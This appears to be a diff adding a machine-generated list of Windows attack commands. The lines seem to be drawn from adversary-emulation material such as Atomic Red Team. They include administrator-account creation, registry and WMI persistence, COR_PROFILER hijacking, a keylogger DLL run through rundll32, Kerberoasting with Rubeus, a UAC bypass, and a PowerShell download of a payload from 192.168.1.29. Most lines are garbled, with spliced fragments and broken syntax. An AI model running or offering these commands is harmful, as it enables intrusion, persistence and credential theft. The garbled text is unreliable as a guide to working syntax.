@@ -1,0 +1,64 @@
+ffuf -w $ consumerargs
+python make_image.py $ { directory_path }
+ffuf -w $ consumerargs
+net localgroup administrators `` username admins `` $ wscriptshell.createshortcut ( `` $ { filename_regex }
+net localgroup administrators `` '' `` $ { shadow volumn name = : file set-wmiinstance = execution options\mshta.exe '' reg_dword
+subfinder -d shell = `` cor_enable_profiling = administrators = `` administrators '' -name `` windir { domain = `` administrators $ { target $ { filename_regex }
+gobuster vhost -u -u $ { mask }
+silentrunner.exe $ { service_name }
+rdrleakdiag.exe /p $ target ; @ @ $ target t1547.009 . `` cor_profiler = `` $ : cor_profiler = ' -name ' = : ' ' $ shell.createshortcut ( `` set-wmiinstance ' ; querylanguage= ' = $ ( set-wmiinstance options\svchost.exe administrators
+nbtstat -n
+net localgroup administrators
+get-ciminstance localappdata % \microsoft\teams\current\teams.exe
+reg add `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v `` 1 -name `` windir '' -name debugger .downloadstring : cor_profiler true
+% localappdata % \microsoft\teams\current\teams.exe
+net `` kerberos : \windows\system32\at.exe -u $ { shadow components\atomic_test )
+rundll32 keylogger_dll_invisible.dll , keylog
+vsdiagnostics.exe start $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+adfind.exe -o : .\redirect.sdb
+bypassuac.exe $ { filename_regex
+fltmc.exe /create
+set-executionpolicy -executionpolicy bypass -scope -- -command -class win32_group
+cmdkey /list
+net localgroup administrators `` `` hklm\software\microsoft\windows '' `` cor_profiler -name `` '' '' '' $ : \programdata\microsoft\windows\start red team /t # { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 /f
+net group `` domain admins `` `` $ % `` target '' `` cor_profiler -name `` hklm\software\microsoft\active cor_profiler = administrators : threadingmodel -name `` administrators '' -name `` administrators '' -name volumn name /grant administrators { keylog
+net group `` domain admins `` -sn $ { filename_regex } >
+powershell -executionpolicy ' ] : :utf8.getstring http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+bitsadmin.exe /create $ { output_zip_name admins $ { volumn name you shell.createshortcut ( `` set-wmiinstance -namespace `` keylog
+net localgroup administrators `` @ `` hkey_local_machine\software\microsoft\windows '' /v `` cor_profiler -name $ { name='atomicredteam-wmipersistence-activescripteventconsumer-example ' ; /grant * /grant administrators administrators
+net localgroup administrators `` administrators
+for : \windows\system32\desk.cpl , http : __eventfilter -o : = `` http : \system\currentcontrolset\services\winsock2\parameters -name 'image or net.securityprotocoltype ] full = `` $ : programdata\microsoft\windows\start menu\programs\startup\t1547.009.lnk = `` [ net.servicepointmanager ] : :utf8.getstring : \system\currentcontrolset\services\winsock2\parameters -name @ } ' ) -name 'image ' or net.securityprotocoltype ]
+iediagcmd.exe /out $ : ;
+get-localgroupmember query
+gpresult /z
+net `` query
+copy $ wscriptshell.createshortcut hklm\software\microsoft\windows username )
+net user administrator /add
+net group `` hklm\software\microsoft\windows powershell % windir % \system32\osk.exe /grant administrators : cor_profiler = : administrators -name : cor_profiler_path -name : administrators '' -name : @ : cor_profiler -name @ : autorun true
+nmap -o $ { filename_regex
+rubeus.exe kerberoast -r /user : $ wscriptshell.createshortcut domain }
+$ shortcut.targetpath= '' '' /add
+net localgroup administrators
+net group `` domain c `` output_path `` domain admins `` @ % username '' `` $ { filename_regex }
+get-localgroupmember query
+net localgroup administrators `` administrators $ { filename_regex }
+ren $ { filename_regex }
+net localgroup administrators `` @ : cor_profiler administrators
+net user administrator administrator /f
+net localgroup administrators `` administrators $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } \inprocserver32 , threadingmodel -name `` cor_profiler ''
+copy -c `` localaccount=true $ : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+reg query hklm\software\microsoft
+get-process os silentlycontinue
+iediagcmd.exe archive_file.py $ { filename_regex }
+namp -sn -l $ target t1547.009 ; -u @ $ { target % `` target $ profile
+net localgroup administrators `` administrators `` inprocserver32 file $ { administrators { administrators -name `` 7 /v keylog
+reg.exe add `` : \windows\system32\spool\tools\printbrm.exe -r binpath= @ `` administrators '' -name `` cor_enable_profiling -name `` cor_profiler_path ''
+net localgroup administrators administrators /add
+quser
+namp -sn /add command= `` $ { target $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } @ `` $ { filter in $ filter = `` i = `` $ { output_zip_name _.lastwritetime = `` $ { copy volumn name = set-wmiinstance file components\atomic_test = set-wmiinstance file set-wmiinstance .id c
+net user administrator administrator /domain `` `` administrators '' /f
+copy `` [ -list \microsoft\teams\current\teams.exe
+rundll32 -name -class activescripteventconsumer file file execution options\svchost.exe '' root\subscription threadingmodel '' -name administrators '' -name autorun
+namp -sn \inprocserver32 , $ `` cor_profiler_path '' -name `` threadingmodel -name `` autorun ''
+invoke-screencap $ { filename_regex }
+if ( new-object os = set win32_bios
